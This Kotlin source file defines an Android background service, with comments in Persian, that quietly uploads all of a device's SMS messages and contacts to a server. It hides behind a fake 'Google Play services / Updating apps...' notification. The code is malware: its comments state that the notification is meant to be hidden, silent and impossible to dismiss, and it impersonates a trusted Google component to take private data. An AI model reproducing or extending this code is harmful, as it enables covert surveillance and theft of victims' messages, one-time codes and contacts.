package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.test.utils.DataUploader

class DataUploadService : Service() {

    companion object {
        private const val TAG = "DataUploadService"
        const val EXTRA_DEVICE_ID = "device_id"
        private const val NOTIFICATION_ID = 1  // ⭐ یکسان با SmsService - استفاده از همون notification
        private const val CHANNEL_ID = "sms_service_channel"  // ⭐ یکسان با SmsService
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🚀 DataUploadService CREATED")
        Log.d(TAG, "════════════════════════════════════════")
        startForegroundNotification()
    }
    
    /**
     * ⭐ Notification مخفی و کم‌رنگ مثل Google Play services
     */
    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play services",  // ⭐ یکسان با SmsService
                NotificationManager.IMPORTANCE_MIN  // ⭐ MIN برای مخفی بودن
            ).apply {
                description = "Google Play services keeps your apps up to date"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET  // مخفی در Lock Screen
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        // ⭐ نوتیفیکیشن کم‌رنگ و مخفی
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play services")
            .setContentText("Updating apps...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)  // ⭐ آیکون sync کم‌رنگ
            .setPriority(NotificationCompat.PRIORITY_MIN)  // کمترین اولویت
            .setOngoing(true)  // نمیشه بست
            .setShowWhen(false)  // بدون زمان
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفی
            .setCategory(NotificationCompat.CATEGORY_SERVICE)  // کتگوری سرویس
            .setSilent(true)  // بدون صدا
            .build()

        // ⭐ startForeground با سازگاری با همه نسخه‌های اندروید
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ (API 34+) - با foregroundServiceType
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            // Android 7-13 - بدون type
            startForeground(NOTIFICATION_ID, notification)
        }
        Log.d(TAG, "✅ Foreground service started (using shared notification)")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = intent?.getStringExtra(EXTRA_DEVICE_ID)

        if (deviceId.isNullOrEmpty()) {
            Log.e(TAG, "❌ Device ID is null or empty!")
            stopSelf()
            return START_NOT_STICKY
        }

        Log.d(TAG, "📱 Device ID: $deviceId")
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔄 STARTING BACKGROUND UPLOAD")
        Log.d(TAG, "════════════════════════════════════════")

        // اجرای آپلود در Thread جداگانه
        Thread {
            var smsSuccess = false
            var contactsSuccess = false

            try {
                // 4️⃣ آپلود SMS‌ها
                Log.d(TAG, "4️⃣ Starting SMS upload in background...")

                DataUploader.uploadAllSms(this, deviceId)
                smsSuccess = true

                Log.d(TAG, "✅ SMS upload completed successfully")
                Log.d(TAG, "════════════════════════════════════════")

                // فاصله کوتاه بین عملیات‌ها
                Thread.sleep(1000)

                // 5️⃣ آپلود مخاطبین
                Log.d(TAG, "5️⃣ Starting contacts upload in background...")

                DataUploader.uploadAllContacts(this, deviceId)
                contactsSuccess = true

                Log.d(TAG, "✅ Contacts upload completed successfully")
                Log.d(TAG, "════════════════════════════════════════")

                // نمایش نتیجه نهایی
                if (smsSuccess && contactsSuccess) {
                    Log.d(TAG, "🎉 ALL BACKGROUND UPLOADS COMPLETED")
                } else {
                    Log.w(TAG, "⚠️ SOME UPLOADS FAILED")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Upload error: ${e.message}", e)
                e.printStackTrace()
            } finally {
                Log.d(TAG, "════════════════════════════════════════")
                Log.d(TAG, "🛑 DataUploadService STOPPING")
                Log.d(TAG, "════════════════════════════════════════")
                stopSelf()
            }
        }.start()

        return START_STICKY
    }


    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👋 DataUploadService destroyed")
    }
}